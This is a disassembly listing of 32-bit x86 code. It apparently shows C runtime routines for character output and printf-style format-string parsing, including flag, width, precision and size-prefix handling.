  404d36:	0f be c0             	movsbl %al,%eax
  404d39:	51                   	push   %ecx
  404d3a:	50                   	push   %eax
  404d3b:	e8 b5 c8 ff ff       	call   0x4015f5
  404d40:	59                   	pop    %ecx
  404d41:	59                   	pop    %ecx
  404d42:	83 f8 ff             	cmp    $0xffffffff,%eax
  404d45:	75 03                	jne    0x404d4a
  404d47:	09 06                	or     %eax,(%esi)
  404d49:	c3                   	ret
  404d4a:	ff 06                	incl   (%esi)
  404d4c:	c3                   	ret
  404d4d:	8b ff                	mov    %edi,%edi
  404d4f:	55                   	push   %ebp
  404d50:	8b ec                	mov    %esp,%ebp
  404d52:	56                   	push   %esi
  404d53:	8b f0                	mov    %eax,%esi
  404d55:	eb 13                	jmp    0x404d6a
  404d57:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404d5a:	8a 45 08             	mov    0x8(%ebp),%al
  404d5d:	ff 4d 0c             	decl   0xc(%ebp)
  404d60:	e8 b5 ff ff ff       	call   0x404d1a
  404d65:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  404d68:	74 06                	je     0x404d70
  404d6a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404d6e:	7f e7                	jg     0x404d57
  404d70:	5e                   	pop    %esi
  404d71:	5d                   	pop    %ebp
  404d72:	c3                   	ret
  404d73:	8b ff                	mov    %edi,%edi
  404d75:	55                   	push   %ebp
  404d76:	8b ec                	mov    %esp,%ebp
  404d78:	f6 47 0c 40          	testb  $0x40,0xc(%edi)
  404d7c:	53                   	push   %ebx
  404d7d:	56                   	push   %esi
  404d7e:	8b f0                	mov    %eax,%esi
  404d80:	8b d9                	mov    %ecx,%ebx
  404d82:	74 32                	je     0x404db6
  404d84:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
  404d88:	75 2c                	jne    0x404db6
  404d8a:	8b 45 08             	mov    0x8(%ebp),%eax
  404d8d:	01 06                	add    %eax,(%esi)
  404d8f:	eb 2b                	jmp    0x404dbc
  404d91:	8a 03                	mov    (%ebx),%al
  404d93:	ff 4d 08             	decl   0x8(%ebp)
  404d96:	8b cf                	mov    %edi,%ecx
  404d98:	e8 7d ff ff ff       	call   0x404d1a
  404d9d:	43                   	inc    %ebx
  404d9e:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  404da1:	75 13                	jne    0x404db6
  404da3:	e8 d7 cb ff ff       	call   0x40197f
  404da8:	83 38 2a             	cmpl   $0x2a,(%eax)
  404dab:	75 0f                	jne    0x404dbc
  404dad:	8b cf                	mov    %edi,%ecx
  404daf:	b0 3f                	mov    $0x3f,%al
  404db1:	e8 64 ff ff ff       	call   0x404d1a
  404db6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  404dba:	7f d5                	jg     0x404d91
  404dbc:	5e                   	pop    %esi
  404dbd:	5b                   	pop    %ebx
  404dbe:	5d                   	pop    %ebp
  404dbf:	c3                   	ret
  404dc0:	8b ff                	mov    %edi,%edi
  404dc2:	55                   	push   %ebp
  404dc3:	8b ec                	mov    %esp,%ebp
  404dc5:	81 ec 78 02 00 00    	sub    $0x278,%esp
  404dcb:	a1 60 db 40 00       	mov    0x40db60,%eax
  404dd0:	33 c5                	xor    %ebp,%eax
  404dd2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404dd5:	53                   	push   %ebx
  404dd6:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404dd9:	56                   	push   %esi
  404dda:	8b 75 08             	mov    0x8(%ebp),%esi
  404ddd:	33 c0                	xor    %eax,%eax
  404ddf:	57                   	push   %edi
  404de0:	8b 7d 14             	mov    0x14(%ebp),%edi
  404de3:	ff 75 10             	push   0x10(%ebp)
  404de6:	8d 8d b0 fd ff ff    	lea    -0x250(%ebp),%ecx
  404dec:	89 b5 a0 fd ff ff    	mov    %esi,-0x260(%ebp)
  404df2:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  404df8:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  404dfe:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
  404e04:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  404e0a:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  404e10:	89 85 d0 fd ff ff    	mov    %eax,-0x230(%ebp)
  404e16:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  404e1c:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  404e22:	e8 32 c9 ff ff       	call   0x401759
  404e27:	85 f6                	test   %esi,%esi
  404e29:	75 35                	jne    0x404e60
  404e2b:	e8 4f cb ff ff       	call   0x40197f
  404e30:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404e36:	33 c0                	xor    %eax,%eax
  404e38:	50                   	push   %eax
  404e39:	50                   	push   %eax
  404e3a:	50                   	push   %eax
  404e3b:	50                   	push   %eax
  404e3c:	50                   	push   %eax
  404e3d:	e8 d5 ca ff ff       	call   0x401917
  404e42:	83 c4 14             	add    $0x14,%esp
  404e45:	80 bd bc fd ff ff 00 	cmpb   $0x0,-0x244(%ebp)
  404e4c:	74 0a                	je     0x404e58
  404e4e:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  404e54:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404e58:	83 c8 ff             	or     $0xffffffff,%eax
  404e5b:	e9 ff 0a 00 00       	jmp    0x40595f
  404e60:	f6 46 0c 40          	testb  $0x40,0xc(%esi)
  404e64:	75 5e                	jne    0x404ec4
  404e66:	56                   	push   %esi
  404e67:	e8 45 ef ff ff       	call   0x403db1
  404e6c:	59                   	pop    %ecx
  404e6d:	ba 50 d2 40 00       	mov    $0x40d250,%edx
  404e72:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e75:	74 1b                	je     0x404e92
  404e77:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404e7a:	74 16                	je     0x404e92
  404e7c:	8b c8                	mov    %eax,%ecx
  404e7e:	83 e1 1f             	and    $0x1f,%ecx
  404e81:	8b f0                	mov    %eax,%esi
  404e83:	c1 fe 05             	sar    $0x5,%esi
  404e86:	c1 e1 06             	shl    $0x6,%ecx
  404e89:	03 0c b5 c0 f9 40 00 	add    0x40f9c0(,%esi,4),%ecx
  404e90:	eb 02                	jmp    0x404e94
  404e92:	8b ca                	mov    %edx,%ecx
  404e94:	f6 41 24 7f          	testb  $0x7f,0x24(%ecx)
  404e98:	75 91                	jne    0x404e2b
  404e9a:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e9d:	74 19                	je     0x404eb8
  404e9f:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404ea2:	74 14                	je     0x404eb8
  404ea4:	8b c8                	mov    %eax,%ecx
  404ea6:	83 e0 1f             	and    $0x1f,%eax
  404ea9:	c1 f9 05             	sar    $0x5,%ecx
  404eac:	c1 e0 06             	shl    $0x6,%eax
  404eaf:	03 04 8d c0 f9 40 00 	add    0x40f9c0(,%ecx,4),%eax
  404eb6:	eb 02                	jmp    0x404eba
  404eb8:	8b c2                	mov    %edx,%eax
  404eba:	f6 40 24 80          	testb  $0x80,0x24(%eax)
  404ebe:	0f 85 67 ff ff ff    	jne    0x404e2b
  404ec4:	33 c0                	xor    %eax,%eax
  404ec6:	3b d8                	cmp    %eax,%ebx
  404ec8:	0f 84 5d ff ff ff    	je     0x404e2b
  404ece:	8a 13                	mov    (%ebx),%dl
  404ed0:	89 85 d8 fd ff ff    	mov    %eax,-0x228(%ebp)
  404ed6:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  404edc:	89 85 c0 fd ff ff    	mov    %eax,-0x240(%ebp)
  404ee2:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  404ee8:	88 95 ef fd ff ff    	mov    %dl,-0x211(%ebp)
  404eee:	84 d2                	test   %dl,%dl
  404ef0:	0f 84 50 0a 00 00    	je     0x405946
  404ef6:	43                   	inc    %ebx
  404ef7:	33 c0                	xor    %eax,%eax
  404ef9:	39 85 d8 fd ff ff    	cmp    %eax,-0x228(%ebp)
  404eff:	89 9d c4 fd ff ff    	mov    %ebx,-0x23c(%ebp)
  404f05:	0f 8c 13 0a 00 00    	jl     0x40591e
  404f0b:	8a ca                	mov    %dl,%cl
  404f0d:	80 e9 20             	sub    $0x20,%cl
  404f10:	80 f9 58             	cmp    $0x58,%cl
  404f13:	77 0d                	ja     0x404f22
  404f15:	0f be c2             	movsbl %dl,%eax
  404f18:	0f b6 80 40 a9 40 00 	movzbl 0x40a940(%eax),%eax
  404f1f:	83 e0 0f             	and    $0xf,%eax
  404f22:	8b 8d c0 fd ff ff    	mov    -0x240(%ebp),%ecx
  404f28:	6b c0 09             	imul   $0x9,%eax,%eax
  404f2b:	0f b6 84 08 60 a9 40 	movzbl 0x40a960(%eax,%ecx,1),%eax
  404f32:	00 
  404f33:	6a 08                	push   $0x8
  404f35:	c1 e8 04             	shr    $0x4,%eax
  404f38:	5e                   	pop    %esi
  404f39:	89 85 c0 fd ff ff    	mov    %eax,-0x240(%ebp)
  404f3f:	3b c6                	cmp    %esi,%eax
  404f41:	0f 84 e4 fe ff ff    	je     0x404e2b
  404f47:	6a 07                	push   $0x7
  404f49:	59                   	pop    %ecx
  404f4a:	3b c1                	cmp    %ecx,%eax
  404f4c:	0f 87 ad 09 00 00    	ja     0x4058ff
  404f52:	ff 24 85 70 59 40 00 	jmp    *0x405970(,%eax,4)
  404f59:	33 c0                	xor    %eax,%eax
  404f5b:	83 8d e8 fd ff ff ff 	orl    $0xffffffff,-0x218(%ebp)
  404f62:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  404f68:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  404f6e:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  404f74:	89 85 d0 fd ff ff    	mov    %eax,-0x230(%ebp)
  404f7a:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
  404f80:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  404f86:	e9 74 09 00 00       	jmp    0x4058ff
  404f8b:	0f be c2             	movsbl %dl,%eax
  404f8e:	83 e8 20             	sub    $0x20,%eax
  404f91:	74 48                	je     0x404fdb
  404f93:	83 e8 03             	sub    $0x3,%eax
  404f96:	74 34                	je     0x404fcc
  404f98:	2b c6                	sub    %esi,%eax
  404f9a:	74 24                	je     0x404fc0
  404f9c:	48                   	dec    %eax
  404f9d:	48                   	dec    %eax
  404f9e:	74 14                	je     0x404fb4
  404fa0:	83 e8 03             	sub    $0x3,%eax
  404fa3:	0f 85 56 09 00 00    	jne    0x4058ff
  404fa9:	09 b5 f0 fd ff ff    	or     %esi,-0x210(%ebp)
  404faf:	e9 4b 09 00 00       	jmp    0x4058ff
  404fb4:	83 8d f0 fd ff ff 04 	orl    $0x4,-0x210(%ebp)
  404fbb:	e9 3f 09 00 00       	jmp    0x4058ff
  404fc0:	83 8d f0 fd ff ff 01 	orl    $0x1,-0x210(%ebp)
  404fc7:	e9 33 09 00 00       	jmp    0x4058ff
  404fcc:	81 8d f0 fd ff ff 80 	orl    $0x80,-0x210(%ebp)
  404fd3:	00 00 00 
  404fd6:	e9 24 09 00 00       	jmp    0x4058ff
  404fdb:	83 8d f0 fd ff ff 02 	orl    $0x2,-0x210(%ebp)
  404fe2:	e9 18 09 00 00       	jmp    0x4058ff
  404fe7:	80 fa 2a             	cmp    $0x2a,%dl
  404fea:	75 2c                	jne    0x405018
  404fec:	83 c7 04             	add    $0x4,%edi
  404fef:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  404ff5:	8b 7f fc             	mov    -0x4(%edi),%edi
  404ff8:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  404ffe:	85 ff                	test   %edi,%edi
  405000:	0f 8d f9 08 00 00    	jge    0x4058ff
  405006:	83 8d f0 fd ff ff 04 	orl    $0x4,-0x210(%ebp)
  40500d:	f7 9d cc fd ff ff    	negl   -0x234(%ebp)
  405013:	e9 e7 08 00 00       	jmp    0x4058ff
  405018:	8b 85 cc fd ff ff    	mov    -0x234(%ebp),%eax
  40501e:	6b c0 0a             	imul   $0xa,%eax,%eax
  405021:	0f be ca             	movsbl %dl,%ecx
  405024:	8d 44 08 d0          	lea    -0x30(%eax,%ecx,1),%eax
  405028:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  40502e:	e9 cc 08 00 00       	jmp    0x4058ff
  405033:	83 a5 e8 fd ff ff 00 	andl   $0x0,-0x218(%ebp)
  40503a:	e9 c0 08 00 00       	jmp    0x4058ff
  40503f:	80 fa 2a             	cmp    $0x2a,%dl
  405042:	75 26                	jne    0x40506a
  405044:	83 c7 04             	add    $0x4,%edi
  405047:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  40504d:	8b 7f fc             	mov    -0x4(%edi),%edi
  405050:	89 bd e8 fd ff ff    	mov    %edi,-0x218(%ebp)
  405056:	85 ff                	test   %edi,%edi
  405058:	0f 8d a1 08 00 00    	jge    0x4058ff
  40505e:	83 8d e8 fd ff ff ff 	orl    $0xffffffff,-0x218(%ebp)
  405065:	e9 95 08 00 00       	jmp    0x4058ff
  40506a:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  405070:	6b c0 0a             	imul   $0xa,%eax,%eax
  405073:	0f be ca             	movsbl %dl,%ecx
  405076:	8d 44 08 d0          	lea    -0x30(%eax,%ecx,1),%eax
  40507a:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  405080:	e9 7a 08 00 00       	jmp    0x4058ff
  405085:	80 fa 49             	cmp    $0x49,%dl
  405088:	74 55                	je     0x4050df
  40508a:	80 fa 68             	cmp    $0x68,%dl
  40508d:	74 44                	je     0x4050d3
  40508f:	80 fa 6c             	cmp    $0x6c,%dl
  405092:	74 18                	je     0x4050ac
  405094:	80 fa 77             	cmp    $0x77,%dl
  405097:	0f 85 62 08 00 00    	jne    0x4058ff
  40509d:	81 8d f0 fd ff ff 00 	orl    $0x800,-0x210(%ebp)
  4050a4:	08 00 00 
  4050a7:	e9 53 08 00 00       	jmp    0x4058ff
  4050ac:	80 3b 6c             	cmpb   $0x6c,(%ebx)
  4050af:	75 16                	jne    0x4050c7
  4050b1:	43                   	inc    %ebx
  4050b2:	81 8d f0 fd ff ff 00 	orl    $0x1000,-0x210(%ebp)
  4050b9:	10 00 00 
  4050bc:	89 9d c4 fd ff ff    	mov    %ebx,-0x23c(%ebp)
  4050c2:	e9 38 08 00 00       	jmp    0x4058ff
  4050c7:	83 8d f0 fd ff ff 10 	orl    $0x10,-0x210(%ebp)
  4050ce:	e9 2c 08 00 00       	jmp    0x4058ff
  4050d3:	83 8d f0 fd ff ff 20 	orl    $0x20,-0x210(%ebp)
  4050da:	e9 20 08 00 00       	jmp    0x4058ff
  4050df:	8a 03                	mov    (%ebx),%al
  4050e1:	3c 36                	cmp    $0x36,%al
  4050e3:	75 1d                	jne    0x405102
  4050e5:	80 7b 01 34          	cmpb   $0x34,0x1(%ebx)
  4050e9:	75 17                	jne    0x405102
  4050eb:	43                   	inc    %ebx
  4050ec:	43                   	inc    %ebx
  4050ed:	81 8d f0 fd ff ff 00 	orl    $0x8000,-0x210(%ebp)
  4050f4:	80 00 00 
  4050f7:	89 9d c4 fd ff ff    	mov    %ebx,-0x23c(%ebp)
  4050fd:	e9 fd 07 00 00       	jmp    0x4058ff
  405102:	3c 33                	cmp    $0x33,%al
  405104:	75 1d                	jne    0x405123
  405106:	80 7b 01 32          	cmpb   $0x32,0x1(%ebx)
  40510a:	75 17                	jne    0x405123
  40510c:	43                   	inc    %ebx
  40510d:	43                   	inc    %ebx
  40510e:	81 a5 f0 fd ff ff ff 	andl   $0xffff7fff,-0x210(%ebp)
  405115:	7f ff ff 
  405118:	89 9d c4 fd ff ff    	mov    %ebx,-0x23c(%ebp)
  40511e:	e9 dc 07 00 00       	jmp    0x4058ff
  405123:	3c 64                	cmp    $0x64,%al
  405125:	0f 84 d4 07 00 00    	je     0x4058ff
  40512b:	3c 69                	cmp    $0x69,%al
  40512d:	0f 84 cc 07 00 00    	je     0x4058ff
  405133:	3c 6f                	cmp    $0x6f,%al
  405135:	0f 84 c4 07 00 00    	je     0x4058ff
  40513b:	3c 75                	cmp    $0x75,%al
  40513d:	0f 84 bc 07 00 00    	je     0x4058ff
  405143:	3c 78                	cmp    $0x78,%al
  405145:	0f 84 b4 07 00 00    	je     0x4058ff
  40514b:	3c 58                	cmp    $0x58,%al
  40514d:	0f 84 ac 07 00 00    	je     0x4058ff
  405153:	83 a5 c0 fd ff ff 00 	andl   $0x0,-0x240(%ebp)
  40515a:	83 a5 c8 fd ff ff 00 	andl   $0x0,-0x238(%ebp)
  405161:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  405167:	50                   	push   %eax
  405168:	0f b6 c2             	movzbl %dl,%eax
  40516b:	50                   	push   %eax
  40516c:	e8 33 fa ff ff       	call   0x404ba4
  405171:	59                   	pop    %ecx
  405172:	85 c0                	test   %eax,%eax
  405174:	8a 85 ef fd ff ff    	mov    -0x211(%ebp),%al
  40517a:	59                   	pop    %ecx
  40517b:	74 22                	je     0x40519f
  40517d:	8b 8d a0 fd ff ff    	mov    -0x260(%ebp),%ecx
  405183:	8d b5 d8 fd ff ff    	lea    -0x228(%ebp),%esi
  405189:	e8 8c fb ff ff       	call   0x404d1a
  40518e:	8a 03                	mov    (%ebx),%al
  405190:	43                   	inc    %ebx
  405191:	89 9d c4 fd ff ff    	mov    %ebx,-0x23c(%ebp)
  405197:	84 c0                	test   %al,%al
  405199:	0f 84 8c fc ff ff    	je     0x404e2b
  40519f:	8b 8d a0 fd ff ff    	mov    -0x260(%ebp),%ecx
  4051a5:	8d b5 d8 fd ff ff    	lea    -0x228(%ebp),%esi
  4051ab:	e8 6a fb ff ff       	call   0x404d1a
  4051b0:	e9 4a 07 00 00       	jmp    0x4058ff
  4051b5:	0f be c2             	movsbl %dl,%eax
  4051b8:	83 f8 64             	cmp    $0x64,%eax
  4051bb:	0f 8f ea 01 00 00    	jg     0x4053ab
  4051c1:	0f 84 77 02 00 00    	je     0x40543e
  4051c7:	83 f8 53             	cmp    $0x53,%eax
  4051ca:	0f 8f f3 00 00 00    	jg     0x4052c3
  4051d0:	0f 84 81 00 00 00    	je     0x405257
  4051d6:	83 e8 41             	sub    $0x41,%eax
  4051d9:	74 10                	je     0x4051eb
  4051db:	48                   	dec    %eax
  4051dc:	48                   	dec    %eax
  4051dd:	74 59                	je     0x405238
  4051df:	48                   	dec    %eax
  4051e0:	48                   	dec    %eax
  4051e1:	74 08                	je     0x4051eb
  4051e3:	48                   	dec    %eax
  4051e4:	48                   	dec    %eax
  4051e5:	0f 85 8f 05 00 00    	jne    0x40577a
  4051eb:	80 c2 20             	add    $0x20,%dl
  4051ee:	c7 85 94 fd ff ff 01 	movl   $0x1,-0x26c(%ebp)
  4051f5:	00 00 00 
  4051f8:	88 95 ef fd ff ff    	mov    %dl,-0x211(%ebp)
  4051fe:	83 8d f0 fd ff ff 40 	orl    $0x40,-0x210(%ebp)
  405205:	83 bd e8 fd ff ff 00 	cmpl   $0x0,-0x218(%ebp)
  40520c:	8d 9d f4 fd ff ff    	lea    -0x20c(%ebp),%ebx
  405212:	b8 00 02 00 00       	mov    $0x200,%eax
  405217:	89 9d e4 fd ff ff    	mov    %ebx,-0x21c(%ebp)
  40521d:	89 85 9c fd ff ff    	mov    %eax,-0x264(%ebp)
  405223:	0f 8d 45 02 00 00    	jge    0x40546e
  405229:	c7 85 e8 fd ff ff 06 	movl   $0x6,-0x218(%ebp)
  405230:	00 00 00 
  405233:	e9 a3 02 00 00       	jmp    0x4054db
  405238:	f7 85 f0 fd ff ff 30 	testl  $0x830,-0x210(%ebp)
  40523f:	08 00 00 
  405242:	0f 85 98 00 00 00    	jne    0x4052e0
  405248:	81 8d f0 fd ff ff 00 	orl    $0x800,-0x210(%ebp)
  40524f:	08 00 00 
  405252:	e9 89 00 00 00       	jmp    0x4052e0
  405257:	f7 85 f0 fd ff ff 30 	testl  $0x830,-0x210(%ebp)
  40525e:	08 00 00 
  405261:	75 0a                	jne    0x40526d
  405263:	81 8d f0 fd ff ff 00 	orl    $0x800,-0x210(%ebp)
  40526a:	08 00 00 
  40526d:	8b 8d e8 fd ff ff    	mov    -0x218(%ebp),%ecx
  405273:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405276:	75 05                	jne    0x40527d
  405278:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  40527d:	83 c7 04             	add    $0x4,%edi
  405280:	f7 85 f0 fd ff ff 10 	testl  $0x810,-0x210(%ebp)
  405287:	08 00 00 
  40528a:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  405290:	8b 7f fc             	mov    -0x4(%edi),%edi
  405293:	89 bd e4 fd ff ff    	mov    %edi,-0x21c(%ebp)
  405299:	0f 84 ad 04 00 00    	je     0x40574c
  40529f:	85 ff                	test   %edi,%edi
  4052a1:	75 0b                	jne    0x4052ae
  4052a3:	a1 08 d0 40 00       	mov    0x40d008,%eax
  4052a8:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  4052ae:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  4052b4:	c7 85 c8 fd ff ff 01 	movl   $0x1,-0x238(%ebp)
  4052bb:	00 00 00 
  4052be:	e9 7b 04 00 00       	jmp    0x40573e
  4052c3:	83 e8 58             	sub    $0x58,%eax
  4052c6:	0f 84 d5 02 00 00    	je     0x4055a1
  4052cc:	48                   	dec    %eax
  4052cd:	48                   	dec    %eax
  4052ce:	74 79                	je     0x405349
  4052d0:	2b c1                	sub    %ecx,%eax
  4052d2:	0f 84 26 ff ff ff    	je     0x4051fe
  4052d8:	48                   	dec    %eax
  4052d9:	48                   	dec    %eax
  4052da:	0f 85 9a 04 00 00    	jne    0x40577a
  4052e0:	83 c7 04             	add    $0x4,%edi
  4052e3:	f7 85 f0 fd ff ff 10 	testl  $0x810,-0x210(%ebp)
  4052ea:	08 00 00 
  4052ed:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  4052f3:	74 30                	je     0x405325
  4052f5:	0f b7 47 fc          	movzwl -0x4(%edi),%eax
  4052f9:	50                   	push   %eax
  4052fa:	68 00 02 00 00       	push   $0x200
  4052ff:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  405305:	50                   	push   %eax
  405306:	8d 85 e0 fd ff ff    	lea    -0x220(%ebp),%eax
  40530c:	50                   	push   %eax
  40530d:	e8 75 f8 ff ff       	call   0x404b87
  405312:	83 c4 10             	add    $0x10,%esp
  405315:	85 c0                	test   %eax,%eax
  405317:	74 1f                	je     0x405338
  405319:	c7 85 a8 fd ff ff 01 	movl   $0x1,-0x258(%ebp)
  405320:	00 00 00 
  405323:	eb 13                	jmp    0x405338
  405325:	8a 47 fc             	mov    -0x4(%edi),%al
  405328:	88 85 f4 fd ff ff    	mov    %al,-0x20c(%ebp)
  40532e:	c7 85 e0 fd ff ff 01 	movl   $0x1,-0x220(%ebp)
  405335:	00 00 00 
  405338:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  40533e:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  405344:	e9 31 04 00 00       	jmp    0x40577a
  405349:	8b 07                	mov    (%edi),%eax
  40534b:	83 c7 04             	add    $0x4,%edi
  40534e:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  405354:	85 c0                	test   %eax,%eax
  405356:	74 3c                	je     0x405394
  405358:	8b 48 04             	mov    0x4(%eax),%ecx
  40535b:	85 c9                	test   %ecx,%ecx
  40535d:	74 35                	je     0x405394
  40535f:	f7 85 f0 fd ff ff 00 	testl  $0x800,-0x210(%ebp)
  405366:	08 00 00 
  405369:	0f bf 00             	movswl (%eax),%eax
  40536c:	89 8d e4 fd ff ff    	mov    %ecx,-0x21c(%ebp)
  405372:	74 14                	je     0x405388
  405374:	99                   	cltd
  405375:	2b c2                	sub    %edx,%eax
  405377:	d1 f8                	sar    $1,%eax
  405379:	c7 85 c8 fd ff ff 01 	movl   $0x1,-0x238(%ebp)
  405380:	00 00 00 
  405383:	e9 ec 03 00 00       	jmp    0x405774
  405388:	83 a5 c8 fd ff ff 00 	andl   $0x0,-0x238(%ebp)
  40538f:	e9 e0 03 00 00       	jmp    0x405774
  405394:	a1 04 d0 40 00       	mov    0x40d004,%eax
  405399:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  40539f:	50                   	push   %eax
  4053a0:	e8 eb f5 ff ff       	call   0x404990
  4053a5:	59                   	pop    %ecx
  4053a6:	e9 c9 03 00 00       	jmp    0x405774
  4053ab:	83 f8 70             	cmp    $0x70,%eax
  4053ae:	0f 8f f5 01 00 00    	jg     0x4055a9
  4053b4:	0f 84 e1 01 00 00    	je     0x40559b
  4053ba:	83 f8 65             	cmp    $0x65,%eax
  4053bd:	0f 8c b7 03 00 00    	jl     0x40577a
  4053c3:	83 f8 67             	cmp    $0x67,%eax
  4053c6:	0f 8e 32 fe ff ff    	jle    0x4051fe
  4053cc:	83 f8 69             	cmp    $0x69,%eax
  4053cf:	74 6d                	je     0x40543e
  4053d1:	83 f8 6e             	cmp    $0x6e,%eax
  4053d4:	74 24                	je     0x4053fa
  4053d6:	83 f8 6f             	cmp    $0x6f,%eax
  4053d9:	0f 85 9b 03 00 00    	jne    0x40577a
  4053df:	f6 85 f0 fd ff ff 80 	testb  $0x80,-0x210(%ebp)
  4053e6:	89 b5 e0 fd ff ff    	mov    %esi,-0x220(%ebp)
  4053ec:	74 61                	je     0x40544f
  4053ee:	81 8d f0 fd ff ff 00 	orl    $0x200,-0x210(%ebp)
  4053f5:	02 00 00 
  4053f8:	eb 55                	jmp    0x40544f
  4053fa:	8b 37                	mov    (%edi),%esi
  4053fc:	83 c7 04             	add    $0x4,%edi
  4053ff:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  405405:	e8 6f f5 ff ff       	call   0x404979
  40540a:	85 c0                	test   %eax,%eax
  40540c:	0f 84 19 fa ff ff    	je     0x404e2b
  405412:	f6 85 f0 fd ff ff 20 	testb  $0x20,-0x210(%ebp)
  405419:	74 0c                	je     0x405427
  40541b:	66 8b 85 d8 fd ff ff 	mov    -0x228(%ebp),%ax
  405422:	66 89 06             	mov    %ax,(%esi)
  405425:	eb 08                	jmp    0x40542f
  405427:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  40542d:	89 06                	mov    %eax,(%esi)
  40542f:	c7 85 a8 fd ff ff 01 	movl   $0x1,-0x258(%ebp)
  405436:	00 00 00 
  405439:	e9 a5 04 00 00       	jmp    0x4058e3
  40543e:	83 8d f0 fd ff ff 40 	orl    $0x40,-0x210(%ebp)
  405445:	c7 85 e0 fd ff ff 0a 	movl   $0xa,-0x220(%ebp)
  40544c:	00 00 00 
  40544f:	8b 8d f0 fd ff ff    	mov    -0x210(%ebp),%ecx
  405455:	f7 c1 00 80 00 00    	test   $0x8000,%ecx
  40545b:	0f 84 a7 01 00 00    	je     0x405608
  405461:	03 fe                	add    %esi,%edi
  405463:	8b 47 f8             	mov    -0x8(%edi),%eax
  405466:	8b 57 fc             	mov    -0x4(%edi),%edx
  405469:	e9 d3 01 00 00       	jmp    0x405641
  40546e:	75 11                	jne    0x405481
  405470:	80 fa 67             	cmp    $0x67,%dl
  405473:	75 66                	jne    0x4054db
  405475:	c7 85 e8 fd ff ff 01 	movl   $0x1,-0x218(%ebp)
  40547c:	00 00 00 
  40547f:	eb 5a                	jmp    0x4054db
  405481:	39 85 e8 fd ff ff    	cmp    %eax,-0x218(%ebp)
  405487:	7e 06                	jle    0x40548f
  405489:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  40548f:	81 bd e8 fd ff ff a3 	cmpl   $0xa3,-0x218(%ebp)
  405496:	00 00 00 
  405499:	7e 40                	jle    0x4054db
  40549b:	8b b5 e8 fd ff ff    	mov    -0x218(%ebp),%esi
  4054a1:	81 c6 5d 01 00 00    	add    $0x15d,%esi
  4054a7:	56                   	push   %esi
  4054a8:	e8 ed f3 ff ff       	call   0x40489a
  4054ad:	8a 95 ef fd ff ff    	mov    -0x211(%ebp),%dl
  4054b3:	59                   	pop    %ecx
  4054b4:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  4054ba:	6a 08                	push   $0x8
  4054bc:	85 c0                	test   %eax,%eax
  4054be:	74 10                	je     0x4054d0
  4054c0:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  4054c6:	89 b5 9c fd ff ff    	mov    %esi,-0x264(%ebp)
  4054cc:	8b d8                	mov    %eax,%ebx
  4054ce:	eb 0a                	jmp    0x4054da
  4054d0:	c7 85 e8 fd ff ff a3 	movl   $0xa3,-0x218(%ebp)
  4054d7:	00 00 00 
  4054da:	5e                   	pop    %esi
  4054db:	03 fe                	add    %esi,%edi
  4054dd:	8b 47 f8             	mov    -0x8(%edi),%eax
  4054e0:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  4054e6:	8b 47 fc             	mov    -0x4(%edi),%eax
  4054e9:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  4054ef:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  4054f5:	50                   	push   %eax
  4054f6:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
  4054fc:	0f be c2             	movsbl %dl,%eax
  4054ff:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  405505:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
